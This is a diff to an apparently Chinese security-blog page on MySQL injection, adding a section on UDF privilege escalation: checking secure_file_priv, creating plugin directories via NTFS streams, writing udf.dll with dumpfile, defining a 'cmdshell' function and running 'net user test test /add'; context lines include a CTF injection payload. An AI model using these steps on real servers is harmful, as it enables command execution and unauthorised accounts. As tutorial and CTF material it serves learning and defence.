@@ -723,7 +723,29 @@
 <p>addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc</p>
 <p>原理：输入’或”会通过addslashes转义成\，这表面上可以防止某些SQL注入，但是如果加入%df就会把\吃掉，这是因为\在MYSQL的宽字节编码中是%5c，这时候就会变成一个汉字</p>
 <h5 id="7、二次注入"><a href="#7、二次注入" class="headerlink" title="7、二次注入"></a>7、二次注入</h5><p>原理就是攻击者在输入SQL注入语句时被转义了，但仍把这些恶意的查询放到了数据库，在下一次请求数据时会调用数据库并把恶意数据提取出来，实现被动（二次）注入，一般会在白盒审计中出现，无法通过黑盒这种形式实现。</p>
-<h2 id="0x02案例展示-CTF"><a href="#0x02案例展示-CTF" class="headerlink" title="0x02案例展示(CTF)"></a>0x02案例展示(CTF)</h2><p>借CTF历年赛事经典题目来分析SQL注入绕过姿势</p>
+<h4 id="四、MYSQL提权"><a href="#四、MYSQL提权" class="headerlink" title="四、MYSQL提权"></a>四、MYSQL提权</h4><p>还有一种另类的操作，不属于MYSQL注入但与MYSQL有关</p>
+<h5 id="1、UDF提权"><a href="#1、UDF提权" class="headerlink" title="1、UDF提权"></a>1、UDF提权</h5><p>UDF（用户定义函数）是一类对MySQL服务器功能进行扩充的代码，通过添加新函数，性质就像使用本地MySQL函数abs()或concat()</p>
+<p><strong>条件</strong></p>
+<p>（1）拥有insert，delete权限</p>
+<p>（2）secure_file_priv不为空，且目录可写</p>
+<p>（3）Mysql版本大于5.1时，其文件要放到MYSQL安装目录下的&#x2F;lib&#x2F;plugin文件夹里，Mysql版本小于5.1时，在Windows2000下须放置于c：\Winnt，Windows2003下须放置于c：\Windows</p>
+<p>（4）sqlmap有udf提权的命令</p>
+<p>查询MySQL是否有写入权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27; -- secure_file_priv的值为&#x27;&#x27;时，表示不限制权限，值为null表示不允许导入|导出</span><br></pre></td></tr></table></figure>
+
+<p>创建&#x2F;lib&#x2F;plugin目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select@@basedir;    -- 查找MySQL的目录</span><br><span class="line">select &#x27;udf.ll&#x27; into dumpfile&#x27;C:\\Program Files\\MySQL\\MySQLServer5.1\\lib::$INDEX_ALLOCATION&#x27;;    -- 利用NTFS ADS创建lib目录</span><br><span class="line">select &#x27;udf.dll&#x27; into dumpfile &#x27;C:\\Program  Files\\MySQL\\MySQLServer 5.1\\lib\\lplugin::$INDEX_ALLOCATION&#x27;;    -- 利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+<p>写入udf.dll文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;path\\udf.dll&#x27;)) into dumpfile &#x27;mysqlpath\\lib\\plugin\\udf.dll&#x27;; --  windows下目录结构需要转义双写</span><br><span class="line">select &#x27;hexcode&#x27; into dumpfile &#x27;mysqlpath\\lib\\plugin\\udf.dll&#x27;;  -- 或者直接写入十六进制数据</span><br></pre></td></tr></table></figure>
+
+<p>创建自定义函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">select * from mysql.func;  --  查看新增的自定义函数</span><br></pre></td></tr></table></figure>
+
+<p>执行函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&#x27;net user test test /add&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、MOF提权"><a href="#2、MOF提权" class="headerlink" title="2、MOF提权"></a>2、MOF提权</h5><h5 id="3、启动项提权"><a href="#3、启动项提权" class="headerlink" title="3、启动项提权"></a>3、启动项提权</h5><h2 id="0x02案例展示-CTF"><a href="#0x02案例展示-CTF" class="headerlink" title="0x02案例展示(CTF)"></a>0x02案例展示(CTF)</h2><p>借CTF历年赛事经典题目来分析SQL注入绕过姿势</p>
 <h4 id="一、2024源鲁杯——sInXx"><a href="#一、2024源鲁杯——sInXx" class="headerlink" title="一、2024源鲁杯——sInXx"></a>一、2024源鲁杯——sInXx</h4><p>payload初次尝试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">juan79%27%09and%09%281%3D1%29%23</span><br></pre></td></tr></table></figure>
 
